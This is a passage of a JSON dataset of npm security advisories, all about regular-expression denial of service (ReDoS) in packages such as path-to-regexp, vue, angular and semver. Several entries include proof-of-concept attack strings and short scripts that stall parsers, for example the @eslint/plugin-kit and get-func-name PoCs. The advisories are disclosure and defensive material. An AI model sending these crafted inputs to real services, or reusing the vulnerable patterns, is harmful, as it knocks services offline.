      "description": "### Impact\n\nThe regular expression that is vulnerable to backtracking can be generated in versions before 0.1.12 of `path-to-regexp`, originally reported in CVE-2024-45296\n\n### Patches\n\nUpgrade to 0.1.12.\n\n### Workarounds\n\nAvoid using two parameters within a single path segment, when the separator is not `.` (e.g. no `/:a-:b`). Alternatively, you can define the regex used for both parameters and ensure they do not overlap to allow backtracking.\n\n### References\n\n- https://github.com/advisories/GHSA-9wv6-86v2-598j\n- https://blakeembrey.com/posts/2024-09-web-redos/",
      "summary": "path-to-regexp contains a ReDoS",
      "date": "2024-12-05T22:40:47Z",
      "cve": "CVE-2024-52798",
      "year": 2024
   },
   {
      "package": {
         "raw": "@eslint/plugin-kit@0.2.2",
         "name": "plugin-kit",
         "version": "0.2.2",
         "scope": "eslint"
      },
      "id": "GHSA-7q7g-4xm8-89cq",
      "description": "Crafting a very large and well crafted string can increase the CPU usage and crash the program.\n\n## POC\n\n```js\nconst { ConfigCommentParser } = require(\"@eslint/plugin-kit\");\n\nvar str = \"\";\nfor (var i = 0; i < 1000000; i++) {\n  str += \" \";\n}\nstr += \"A\";\n\nconsole.log(\"start\")\nvar parser = new ConfigCommentParser();\nconsole.log(parser.parseStringConfig(str, \"\"));\nconsole.log(\"end\")\n\n// run `npm i @eslint/plugin-kit` and `node attack.js` \n// then the program will stuck forever with high CPU usage\n```",
      "summary": "Regular Expression Denial of Service (ReDoS) in @eslint/plugin-kit",
      "date": "2024-11-15T20:47:31Z",
      "cve": "CVE-2024-21539",
      "year": 2024
   },
   {
      "package": {
         "raw": "cross-spawn@7.0.4",
         "name": "cross-spawn",
         "version": "7.0.4"
      },
      "id": "GHSA-3xgq-45jj-v275",
      "description": "Versions of the package cross-spawn before 7.0.5 are vulnerable to Regular Expression Denial of Service (ReDoS) due to improper input sanitization. An attacker can increase the CPU usage and crash the program by crafting a very large and well crafted string.",
      "summary": "Regular Expression Denial of Service (ReDoS) in cross-spawn",
      "date": "2024-11-08T06:30:47Z",
      "cve": "CVE-2024-21538",
      "year": 2024
   },
   {
      "package": {
         "raw": "useragent@2.3.0",
         "name": "useragent",
         "version": "2.3.0"
      },
      "id": "GHSA-mgfv-m47x-4wqp",
      "description": "Useragent is a user agent parser for Node.js. All versions as of time of publication contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS).",
      "summary": "useragent Regular Expression Denial of Service vulnerability",
      "date": "2024-10-26T21:30:47Z",
      "cve": "CVE-2020-26311",
      "year": 2020
   },
   {
      "package": {
         "raw": "nope-validator@0.12.0",
         "name": "nope-validator",
         "version": "0.12.0"
      },
      "id": "GHSA-3phv-83cj-p8p7",
      "description": "Nope is a JavaScript validator. Versions 0.11.3 and prior contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS). This vulnerability is fixed in 0.12.1.",
      "summary": "nope-validator Regular Expression Denial of Service vulnerability",
      "date": "2024-10-26T21:30:46Z",
      "cve": "CVE-2020-26309",
      "year": 2020
   },
   {
      "package": {
         "raw": "knwl.js@1.0.2",
         "name": "knwl.js",
         "version": "1.0.2"
      },
      "id": "GHSA-68qg-g787-3rp5",
      "description": "Knwl.js is a Javascript library that parses through text for dates, times, phone numbers, emails, places, and more. Versions 1.0.2 and prior contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS). As of time of publication, no known patches are available.",
      "summary": "Knwl.js Regular Expression Denial of Service vulnerability",
      "date": "2024-10-26T21:30:46Z",
      "cve": "CVE-2020-26306",
      "year": 2020
   },
   {
      "package": {
         "raw": "foundation-sites@6.3.1",
         "name": "foundation-sites",
         "version": "6.3.1"
      },
      "id": "GHSA-p8pc-3f7w-jr5q",
      "description": "Foundation is a front-end framework. Versions 6.3.3 and prior contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS). As of time of publication, it is unknown if any fixes are available.",
      "summary": "Foundation Regular Expression Denial of Service vulnerability",
      "date": "2024-10-26T21:30:46Z",
      "cve": "CVE-2020-26304",
      "year": 2020
   },
   {
      "package": {
         "raw": "commonregex@0.3.1",
         "name": "commonregex",
         "version": "0.3.1"
      },
      "id": "GHSA-pmvv-57rg-5g86",
      "description": "CommonRegexJS is a CommonRegex port for JavaScript. All available versions contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS). As of time of publication, no known patches are available.",
      "summary": "CommonRegexJS Regular Expression Denial of Service vulnerability",
      "date": "2024-10-26T21:30:46Z",
      "cve": "CVE-2020-26305",
      "year": 2020
   },
   {
      "package": {
         "raw": "validate.js@0.13.1",
         "name": "validate.js",
         "version": "0.13.1"
      },
      "id": "GHSA-rv73-9c8w-jp4c",
      "description": "Validate.js provides a declarative way of validating javascript objects. Versions 0.13.1 and prior contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS). As of time of publication, no known patches are available.",
      "summary": "validate.js Regular Expression Denial of Service vulnerability",
      "date": "2024-10-26T21:30:46Z",
      "cve": "CVE-2020-26308",
      "year": 2020
   },
   {
      "package": {
         "raw": "insane@2.6.2",
         "name": "insane",
         "version": "2.6.2"
      },
      "id": "GHSA-w455-mfq9-hf74",
      "description": "insane is a whitelist-oriented HTML sanitizer. Versions 2.6.2 and prior contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS). As of time of publication, no known patches are available.",
      "summary": "insane vulnerable to Regular Expression Denial of Service",
      "date": "2024-10-26T21:30:46Z",
      "cve": "CVE-2020-26303",
      "year": 2020
   },
   {
      "package": {
         "raw": "vue@2.7.16",
         "name": "vue",
         "version": "2.7.16"
      },
      "id": "GHSA-5j4c-8p2g-v4jx",
      "description": "The ReDoS can be exploited through the `parseHTML` function in the `html-parser.ts` file. This flaw allows attackers to slow down the application by providing specially crafted input that causes inefficient processing of regular expressions, leading to excessive resource consumption.\n\nTo demonstrate this vulnerability, here's an example. In a Vue client-side application, create a new Vue instance with a template string that includes a `<script>` tag but closes it incorrectly with something like `</textarea>`.\n\n```javascript\nnew Vue({\n  el: '#app',\n  template: '\n    <div>\n      Hello, world!\n      <script>${'<'.repeat(1000000)}</textarea>\n    </div>'\n});\n```\nNext, set up a basic HTML page (e.g., index.html) to load this JavaScript and mount the Vue instance:\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n  <title>My first Vue app</title>\n</head>\n<body>\n  <div id=\\\"app\\\">Loading...</div>\n</body>\n</html>\n```\n\nWhen you visit the app in your browser at http://localhost:3000, you'll notice that the time taken to parse and mount the Vue application increases significantly due to the ReDoS vulnerability, demonstrating how the flaw can affect performance.",
      "summary": "ReDoS vulnerability in vue package that is exploitable through inefficient regex evaluation in the parseHTML function",
      "date": "2024-10-15T18:30:50Z",
      "cve": "CVE-2024-9506",
      "year": 2024
   },
   {
      "package": {
         "raw": "find-my-way@9.0.0",
         "name": "find-my-way",
         "version": "9.0.0"
      },
      "id": "GHSA-rrr8-f88r-h8q6",
      "description": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, when adding a `-` at the end, like `/:a-:b-`.\n\n### Patches\n\nUpdate to find-my-way v8.2.2 or v9.0.1. or subsequent versions.\n\n### Workarounds\n\nNo known workarounds.\n\n### References\n\n- [CVE-2024-45296](https://github.com/advisories/GHSA-9wv6-86v2-598j)\n- [Detailed blog post about `path-to-regexp` vulnerability](https://blakeembrey.com/posts/2024-09-web-redos/)",
      "summary": "find-my-way has a ReDoS vulnerability in multiparametric routes",
      "date": "2024-09-18T15:52:33Z",
      "cve": "CVE-2024-45813",
      "year": 2024
   },
   {
      "package": {
         "raw": "path-to-regexp@0.1.9",
         "name": "path-to-regexp",
         "version": "0.1.9"
      },
      "id": "GHSA-9wv6-86v2-598j",
      "description": "### Impact\n\nA bad regular expression is generated any time you have two parameters within a single segment, separated by something that is not a period (`.`). For example, `/:a-:b`.\n\n### Patches\n\nFor users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.\n\nThese versions add backtrack protection when a custom regex pattern is not provided:\n\n- [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10)\n- [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0)\n- [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0)\n- [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)\n\nThey do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.\n\nVersion [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.\n\nVersion [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.\n\n### Workarounds\n\nAll versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.\n\nIf paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.\n\n### Details\n\nUsing `/:a-:b` will produce the regular expression `/^\\/([^\\/]+?)-([^\\/]+?)\\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.\n\nBecause JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.\n\n### References\n\n* [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)\n* [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",
      "summary": "path-to-regexp outputs backtracking regular expressions",
      "date": "2024-09-09T20:19:15Z",
      "cve": "CVE-2024-45296",
      "year": 2024
   },
   {
      "package": {
         "raw": "urlregex@0.5.0",
         "name": "urlregex",
         "version": "0.5.0"
      },
      "id": "GHSA-rw72-v6c7-hf9r",
      "description": "A vulnerability was found in nescalante urlregex up to 0.5.0 and classified as problematic. This issue affects some unknown processing of the file index.js of the component Backtracking. The manipulation leads to inefficient regular expression complexity. The attack may be initiated remotely. The exploit has been disclosed to the public and may be used. Upgrading to version 0.5.1 is able to address this issue. The identifier of the patch is e5a085afe6abfaea1d1a78f54c45af9ef43ca1f9. It is recommended to upgrade the affected component.",
      "summary": "ReDoS in urlregex",
      "date": "2024-09-02T18:31:24Z",
      "cve": "CVE-2020-36830",
      "year": 2020
   },
   {
      "package": {
         "raw": "fast-xml-parser@4.4.0",
         "name": "fast-xml-parser",
         "version": "4.4.0"
      },
      "id": "GHSA-mpg4-rc92-vx8v",
      "description": "### Summary\nA ReDOS that exists on currency.js was discovered by Gauss Security Labs R&D team.\n\n### Details\nhttps://github.com/NaturalIntelligence/fast-xml-parser/blob/v4.4.0/src/v5/valueParsers/currency.js#L10 contains a vulnerable regex \n\n### PoC\npass the following string '\\t'.repeat(13337)  + '.'\n\n### Impact\nDenial of service during currency parsing in experimental version 5 of fast-xml-parser-library\n\nhttps://gauss-security.com",
      "summary": "fast-xml-parser vulnerable to ReDOS at currency parsing",
      "date": "2024-07-29T17:46:16Z",
      "cve": "CVE-2024-41818",
      "year": 2024
   },
   {
      "package": {
         "raw": "tf2-item-format@5.9.13",
         "name": "tf2-item-format",
         "version": "5.9.13"
      },
      "id": "GHSA-8h55-q5qq-p685",
      "description": "## Summary\n\nVersions of `tf2-item-format` since at least `4.2.6` are vulnerable to a Regular Expression Denial of Service (ReDoS) attack when parsing crafted user input. \n\n## Tested Versions\n\n- `5.9.13`\n- `5.8.10`\n- `5.7.0`\n- `5.6.17`\n- `4.3.5`\n- `4.2.6`\n\n### v5\nUpgrade package to `^5.9.14`\n\n### v4\nNo patch exists. Please consult the [v4 to v5 migration guide](https://github.com/danocmx/node-tf2-item-format?tab=readme-ov-file#migrating-from-v4-to-v5) to upgrade to v5.\n\nIf upgrading to v5 is not possible, fork the module repository and implement the fix detailed below.\n\n## Impact\n\nThis vulnerability can be exploited by an attacker to perform DoS attacks on any service that uses any `tf2-item-format` to parse user input.",
      "summary": "(ReDoS) Regular Expression Denial of Service in tf2-item-format",
      "date": "2024-07-23T14:10:45Z",
      "cve": "CVE-2024-41655",
      "year": 2024
   },
   {
      "package": {
         "raw": "micromatch@4.0.7",
         "name": "micromatch",
         "version": "4.0.7"
      },
      "id": "GHSA-952p-6rrq-rcjv",
      "description": "The NPM package `micromatch` prior to version 4.0.8 is vulnerable to Regular Expression Denial of Service (ReDoS). The vulnerability occurs in `micromatch.braces()` in `index.js` because the pattern `.*` will greedily match anything. By passing a malicious payload, the pattern matching will keep backtracking to the input while it doesn't find the closing bracket. As the input size increases, the consumption time will also increase until it causes the application to hang or slow down. There was a merged fix but further testing shows the issue persisted prior to https://github.com/micromatch/micromatch/pull/266. This issue should be mitigated by using a safe pattern that won't start backtracking the regular expression due to greedy matching.\n",
      "summary": "Regular Expression Denial of Service (ReDoS) in micromatch",
      "date": "2024-05-14T18:30:54Z",
      "cve": "CVE-2024-4067",
      "year": 2024
   },
   {
      "package": {
         "raw": "xlsx@0.18.5",
         "name": "xlsx",
         "version": "0.18.5"
      },
      "id": "GHSA-5pgg-2g8v-p4x9",
      "description": "SheetJS Community Edition before 0.20.2 is vulnerable.to Regular Expression Denial of Service (ReDoS).",
      "summary": "SheetJS Regular Expression Denial of Service (ReDoS)",
      "date": "2024-04-05T06:30:46Z",
      "cve": "CVE-2024-22363",
      "year": 2024
   },
   {
      "package": {
         "raw": "domain-suffix@1.0.8",
         "name": "domain-suffix",
         "version": "1.0.8"
      },
      "id": "GHSA-cqfh-c4c5-c2hg",
      "description": "RegEx Denial of Service in domain-suffix 1.0.8 allows attackers to crash the application via crafted input to the parse function.",
      "summary": "domain-suffix RegEx Denial of Service",
      "date": "2024-03-28T00:31:40Z",
      "cve": "CVE-2024-25354",
      "year": 2024
   },
   {
      "package": {
         "raw": "es5-ext@0.10.62",
         "name": "es5-ext",
         "version": "0.10.62"
      },
      "id": "GHSA-4gmj-3p3h-gm8h",
      "description": "### Impact\n\nPassing functions with very long names or complex default argument names into `function#copy` or`function#toStringTokens` may put script to stall\n\n### Patches\nFixed with https://github.com/medikoo/es5-ext/commit/3551cdd7b2db08b1632841f819d008757d28e8e2 and https://github.com/medikoo/es5-ext/commit/a52e95736690ad1d465ebcd9791d54570e294602\nPublished with v0.10.63\n\n### Workarounds\nNo real workaround aside of refraining from using above utilities.\n\n### References\nhttps://github.com/medikoo/es5-ext/issues/201\n",
      "summary": "es5-ext vulnerable to Regular Expression Denial of Service in `function#copy` and `function#toStringTokens`",
      "date": "2024-02-26T20:01:28Z",
      "cve": "CVE-2024-27088",
      "year": 2024
   },
   {
      "package": {
         "raw": "angular@1.8.3",
         "name": "angular",
         "version": "1.8.3"
      },
      "id": "GHSA-4w4v-5hc9-xrr2",
      "description": "This affects versions of the package angular from 1.3.0. A regular expression used to split the value of the ng-srcset directive is vulnerable to super-linear runtime due to backtracking. With a large carefully-crafted input, this can result in catastrophic backtracking and cause a denial of service. \n\n\n**Note:**\n\nThis package is EOL and will not receive any updates to address this issue. Users should migrate to [@angular/core](https://www.npmjs.com/package/@angular/core).",
      "summary": "angular vulnerable to super-linear runtime due to backtracking",
      "date": "2024-02-10T06:30:19Z",
      "cve": "CVE-2024-21490",
      "year": 2024
   },
   {
      "package": {
         "raw": "nodemailer@6.9.8",
         "name": "nodemailer",
         "version": "6.9.8"
      },
      "id": "GHSA-9h6g-pr28-7cqp",
      "description": "### Summary\nA ReDoS vulnerability occurs when nodemailer tries to parse img files with the parameter `attachDataUrls` set, causing the stuck of event loop. \nAnother flaw was found when nodemailer tries to parse an attachments with a embedded file, causing the stuck of event loop. \n\n### Details\n\nRegex: /^data:((?:[^;]*;)*(?:[^,]*)),(.*)$/\n\nPath: compile -> getAttachments -> _processDataUrl\n\nRegex: /(<img\\b[^>]* src\\s*=[\\s\"']*)(data:([^;]+);[^\"'>\\s]+)/\n\nPath: _convertDataImages\n\n### PoC\n\nhttps://gist.github.com/francoatmega/890dd5053375333e40c6fdbcc8c58df6\nhttps://gist.github.com/francoatmega/9aab042b0b24968d7b7039818e8b2698\n\n### Impact\n\nReDoS causes the event loop to stuck a specially crafted evil email can cause this problem.\n",
      "summary": "nodemailer ReDoS when trying to send a specially crafted email",
      "date": "2024-01-31T22:42:54Z",
      "cve": null,
      "year": 2024
   },
   {
      "package": {
         "raw": "@sentry/astro@7.86.0",
         "name": "astro",
         "version": "7.86.0",
         "scope": "sentry"
      },
      "id": "GHSA-x3v3-8xg8-8v72",
      "description": "### Impact\nA ReDoS (Regular expression Denial of Service) vulnerability has been identified in Sentry's Astro SDK 7.78.0-7.86.0. Under certain conditions, this vulnerability allows an attacker to cause excessive computation times on the server, leading to denial of service (DoS).\n\nApplications that are using Sentry's Astro SDK are affected if:\n\n1. They're using Sentry instrumentation:\n   - they have [manually registered](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/#manually-add-server-instrumentation) Sentry Middleware (affected versions 7.78.0-7.86.0);\n   - or [configured](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/#configure-server-instrumentation) Astro in SSR (server) or hybrid mode, use Astro 3.5.0 and newer and didn’t [disable the automatic server instrumentation](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/#disable-auto-server-instrumentation) (affected versions 7.82.0-7.86.0).\n2. They have configured routes with at least two path params (e.g. `/foo/[p1]/bar/[p2]`).\n\n### Patches\nThe problem has been patched in [@sentry/astro@7.87.0](https://www.npmjs.com/package/@sentry/astro/v/7.87.0).\nThe corresponding PR: https://github.com/getsentry/sentry-javascript/pull/9815\n\n### Workarounds\nWe strongly recommend upgrading to the latest SDK version. However, if it's not possible, the steps to mitigate the vulnerability without upgrade are:\n* [disable auto instrumentation](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/#disable-auto-server-instrumentation) if you're using Astro 3.5.0 or newer\n* and remove the manually added Sentry middleware (if it was [added](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/#manually-add-server-instrumentation) before).\n\nAfter these changes, Sentry error reporting will still be functional, but some details such as server-side transactions (and consequently, distributed traces between client and server) will be omitted. We therefore still recommend to update to 7.87.0 as soon as you can. \n\n### References\n* [Sentry docs: Manual Setup for Astro](https://docs.sentry.io/platforms/javascript/guides/astro/manual-setup/)\n* [Release notes: sentry-javascript 7.87.0](https://github.com/getsentry/sentry-javascript/releases/tag/7.87.0)\n* [npm: @sentry/astro@7.87.0](https://www.npmjs.com/package/@sentry/astro/v/7.87.0)",
      "summary": "Sentry's Astro SDK vulnerable to ReDoS",
      "date": "2023-12-18T20:00:55Z",
      "cve": "CVE-2023-50249",
      "year": 2023
   },
   {
      "package": {
         "raw": "@adobe/css-tools@4.3.1",
         "name": "css-tools",
         "version": "4.3.1",
         "scope": "adobe"
      },
      "id": "GHSA-prr3-c3m5-p7q2",
      "description": "### Impact\n@adobe/css-tools version 4.3.1 and earlier are affected by an Improper Input Validation vulnerability that could result in a denial of service while attempting to parse CSS.\n\n### Patches\nThe issue has been resolved in 4.3.2.\n\n### Workarounds\nNone\n\n### References\nN/A\n",
      "summary": "@adobe/css-tools Improper Input Validation and Inefficient Regular Expression Complexity",
      "date": "2023-11-30T19:51:29Z",
      "cve": "CVE-2023-48631",
      "year": 2023
   },
   {
      "package": {
         "raw": "node-email-check@1.0.4",
         "name": "node-email-check",
         "version": "1.0.4"
      },
      "id": "GHSA-9242-6p36-6256",
      "description": "ReDos in NPMJS Node Email Check v.1.0.4 allows an attacker to cause a denial of service via a crafted string to the scpSyntax component.\n\n",
      "summary": "Inefficient Regular Expression Complexity in node-email-check",
      "date": "2023-10-25T18:32:22Z",
      "cve": "CVE-2023-39619",
      "year": 2023
   },
   {
      "package": {
         "raw": "express-zod-api@9.4.3",
         "name": "express-zod-api",
         "version": "9.4.3"
      },
      "id": "GHSA-mvrp-3cvx-c325",
      "description": "### Impact\n\nAPI servers running `express-zod-api` having:\n\n- version of `express-zod-api` below `10.0.0-beta1`,\n- and using the following (or similar) validation schema in its implementation: `z.string().email()`,\n\nare vulnerable to a DoS attack due to: \n\n- Inefficient Regular Expression Complexity in `zod` versions up to `3.22.2`,\n- depending on `zod`.\n\n### Patches\n\nThe patched version of `zod` fixing the vulnerability is `3.22.3`.\n\nHowever, it's highly recommended to upgrade `express-zod-api` to at least version `10.0.0`, which does not depend on `zod` strictly and directly, but requires its installation as a peer dependency instead, enabling you to install the patched `zod` version yourself.\n\n### Workarounds\n\nWhen it's not possible to upgrade your dependencies, consider the following replacement in your implementation:\n\n```diff\n- z.string().email()\n+ z.string().regex(\n+   /^(?!\\.)(?!.*\\.\\.)([A-Z0-9_+-\\.]*)[A-Z0-9_+-]@([A-Z0-9][A-Z0-9\\-]*\\.)+[A-Z]{2,}$/i\n+ )\n```\n\nThis regular expression is taken from the suggested patch of `zod`.\n\n### References\n\n- Original issue: https://github.com/colinhacks/zod/issues/2609\n- The patch: https://github.com/colinhacks/zod/pull/2824\n- Entry in database: https://nvd.nist.gov/vuln/detail/CVE-2023-4316\n- Enumeration: https://cwe.mitre.org/data/definitions/1333.html\n- Parent advisory: https://github.com/advisories/GHSA-m95q-7qp3-xv42\n- Changelog entry for `express-zod-api` version `10.0.0-beta1`: https://github.com/RobinTail/express-zod-api/blob/master/CHANGELOG.md#v1000-beta1",
      "summary": "Zod denial of service vulnerability during email validation",
      "date": "2023-10-04T14:46:06Z",
      "cve": null,
      "year": 2023
   },
   {
      "package": {
         "raw": "zod@3.22.2",
         "name": "zod",
         "version": "3.22.2"
      },
      "id": "GHSA-m95q-7qp3-xv42",
      "description": "Zod version 3.22.2 allows an attacker to perform a denial of service while validating emails.",
      "summary": "Zod denial of service vulnerability",
      "date": "2023-09-28T21:30:58Z",
      "cve": "CVE-2023-4316",
      "year": 2023
   },
   {
      "package": {
         "raw": "get-func-name@2.0.0",
         "name": "get-func-name",
         "version": "2.0.0"
      },
      "id": "GHSA-4q6p-r6v2-jvc5",
      "description": "The current regex implementation for parsing values in the module is susceptible to excessive backtracking, leading to potential DoS attacks. The regex implementation in question is as follows:\n\n```js\nconst functionNameMatch = /\\s*function(?:\\s|\\s*\\/\\*[^(?:*/)]+\\*\\/\\s*)*([^\\s(/]+)/;\n```\n\nThis vulnerability can be exploited when there is an imbalance in parentheses, which results in excessive backtracking and subsequently increases the CPU load and processing time significantly. This vulnerability can be triggered using the following input:\n\n```js\n'\\t'.repeat(54773) + '\\t/function/i'\n```\n\nHere is a simple PoC code to demonstrate the issue:\n\n```js\nconst protocolre = /\\sfunction(?:\\s|\\s/*[^(?:*\\/)]+*/\\s*)*([^\\(\\/]+)/;\n\nconst startTime = Date.now();\nconst maliciousInput = '\\t'.repeat(54773) + '\\t/function/i'\n\nprotocolre.test(maliciousInput);\n\nconst endTime = Date.now();\n\nconsole.log(\"process time: \", endTime - startTime, \"ms\");\n```",
      "summary": "Chaijs/get-func-name vulnerable to ReDoS",
      "date": "2023-09-27T20:16:00Z",
      "cve": "CVE-2023-43646",
      "year": 2023
   },
   {
      "package": {
         "raw": "@adobe/css-tools@4.3.0",
         "name": "css-tools",
         "version": "4.3.0",
         "scope": "adobe"
      },
      "id": "GHSA-hpx4-r86g-5jrg",
      "description": "### Impact\n@adobe/css-tools version 4.3.0 and earlier are affected by an Improper Input Validation vulnerability that could result in a denial of service while attempting to parse CSS.\n\n### Patches\nThe issue has been resolved in 4.3.1.\n\n### Workarounds\nNone\n\n### References\nN/A\n\n",
      "summary": "@adobe/css-tools Regular Expression Denial of Service (ReDOS) while Parsing CSS",
      "date": "2023-08-29T23:33:26Z",
      "cve": "CVE-2023-26364",
      "year": 2023
   },
   {
      "package": {
         "raw": "mathjax@2.7.9",
         "name": "mathjax",
         "version": "2.7.9"
      },
      "id": "GHSA-v638-q856-grg8",
      "description": "Mathjax up to v2.7.9 was discovered to contain two Regular expression Denial of Service (ReDoS) vulnerabilities in MathJax.js via the components pattern and markdownPattern. NOTE: the vendor disputes this because the regular expressions are not applied to user input; thus, there is no risk.\n\n",
      "summary": "MathJax Regular expression Denial of Service (ReDoS)",
      "date": "2023-08-29T21:30:21Z",
      "cve": "CVE-2023-39663",
      "year": 2023
   },
   {
      "package": {
         "raw": "is_js@0.9.0",
         "name": "is_js",
         "version": "0.9.0"
      },
      "id": "GHSA-pvrw-g6fx-mcx2",
      "description": "is.js is a general-purpose check library. Versions 0.9.0 and prior contain one or more regular expressions that are vulnerable to Regular Expression Denial of Service (ReDoS). is.js uses a regex copy-pasted from a gist to validate URLs. Trying to validate a malicious string can cause the regex to loop \"forever.\" This vulnerability was found using a CodeQL query which identifies inefficient regular expressions. is.js has no patch for this issue.",
      "summary": "is_js vulnerable to Regular Expression Denial of Service",
      "date": "2023-07-06T19:24:05Z",
      "cve": "CVE-2020-26302",
      "year": 2020
   },
   {
      "package": {
         "raw": "word-wrap@1.2.3",
         "name": "word-wrap",
         "version": "1.2.3"
      },
      "id": "GHSA-j8xg-fqg3-53r7",
      "description": "All versions of the package word-wrap are vulnerable to Regular Expression Denial of Service (ReDoS) due to the usage of an insecure regular expression within the result variable.",
      "summary": "word-wrap vulnerable to Regular Expression Denial of Service",
      "date": "2023-06-22T06:30:18Z",
      "cve": "CVE-2023-26115",
      "year": 2023
   },
   {
      "package": {
         "raw": "semver@7.5.1",
         "name": "semver",
         "version": "7.5.1"
      },
      "id": "GHSA-c2qf-rxjj-qqgw",
      "description": "Versions of the package semver before 7.5.2 on the 7.x branch, before 6.3.1 on the 6.x branch, and all other versions before 5.7.2 are vulnerable to Regular Expression Denial of Service (ReDoS) via the function new Range, when untrusted user data is provided as a range.",
      "summary": "semver vulnerable to Regular Expression Denial of Service",
      "date": "2023-06-21T06:30:28Z",
      "cve": "CVE-2022-25883",
      "year": 2022
   },
   {
      "package": {
         "raw": "fast-xml-parser@4.2.3",
         "name": "fast-xml-parser",
         "version": "4.2.3"
      },
      "id": "GHSA-6w63-h3fj-q4vw",
      "description": "### Impact\n\"fast-xml-parser\" allows special characters in entity names, which are not escaped or sanitized. Since the entity name is used for creating a regex for searching and replacing entities in the XML body, an attacker can abuse it for DoS attacks. By crafting an entity name that results in an intentionally bad performing regex and utilizing it in the entity replacement step of the parser, this can cause the parser to stall for an indefinite amount of time.\n\n### Patches\nThe problem has been resolved in v4.2.4\n\n### Workarounds\nAvoid using DOCTYPE parsing by `processEntities: false` option.\n",
      "summary": "fast-xml-parser vulnerable to Regex Injection via Doctype Entities",
      "date": "2023-06-06T17:33:13Z",
      "cve": "CVE-2023-34104",
      "year": 2023
   },
   {
      "package": {
         "raw": "angular@1.8.3",
         "name": "angular",
         "version": "1.8.3"
      },
      "id": "GHSA-2vrf-hf26-jrp5",
      "description": "All versions of the package angular are vulnerable to Regular Expression Denial of Service (ReDoS) via the angular.copy() utility function due to the usage of an insecure regular expression. Exploiting this vulnerability is possible by a large carefully-crafted input, which can result in catastrophic backtracking.",
      "summary": "angular vulnerable to regular expression denial of service via the angular.copy() utility",
      "date": "2023-03-30T06:30:26Z",
      "cve": "CVE-2023-26116",
      "year": 2023
   },
   {
      "package": {
         "raw": "angular@1.8.3",
         "name": "angular",
         "version": "1.8.3"
      },
      "id": "GHSA-2qqx-w9hr-q5gx",
      "description": "All versions of the package angular are vulnerable to Regular Expression Denial of Service (ReDoS) via the $resource service due to the usage of an insecure regular expression. Exploiting this vulnerability is possible by a large carefully-crafted input, which can result in catastrophic backtracking.",
      "summary": "angular vulnerable to regular expression denial of service via the $resource service",
      "date": "2023-03-30T06:30:26Z",
      "cve": "CVE-2023-26117",
      "year": 2023
   },
   {
      "package": {
         "raw": "angular@1.8.3",
         "name": "angular",
         "version": "1.8.3"
      },
      "id": "GHSA-qwqh-hm9m-p5hr",
      "description": "All versions of the package angular are vulnerable to Regular Expression Denial of Service (ReDoS) via the <input type=\"url\"> element due to the usage of an insecure regular expression in the input[url] functionality. Exploiting this vulnerability is possible by a large carefully-crafted input, which can result in catastrophic backtracking.",
      "summary": "angular vulnerable to regular expression denial of service via the <input type=\"url\"> element",
      "date": "2023-03-30T06:30:25Z",
      "cve": "CVE-2023-26118",
      "year": 2023
   },
   {
      "package": {
         "raw": "undici@5.19.0",
         "name": "undici",
         "version": "5.19.0"
      },
      "id": "GHSA-r6ch-mqf9-qc9w",
      "description": "### Impact\nThe `Headers.set()` and `Headers.append()` methods are vulnerable to Regular Expression Denial of Service (ReDoS) attacks when untrusted values are passed into the functions. This is due to the inefficient regular expression used to normalize the values in the `headerValueNormalize()` utility function.\n\n### Patches\n\nThis vulnerability was patched in v5.19.1.\n\n### Workarounds\nThere is no workaround. Please update to an unaffected version.\n\n### References\n\n* https://hackerone.com/bugs?report_id=1784449\n\n### Credits\n\nCarter Snook reported this vulnerability.\n",
      "summary": "Regular Expression Denial of Service in Headers",
      "date": "2023-02-16T20:46:10Z",
      "cve": "CVE-2023-24807",
      "year": 2023
   },
   {
      "package": {
         "raw": "simple-markdown@0.6.0",
         "name": "simple-markdown",
         "version": "0.6.0"
      },
      "id": "GHSA-j533-2g8v-pmpg",
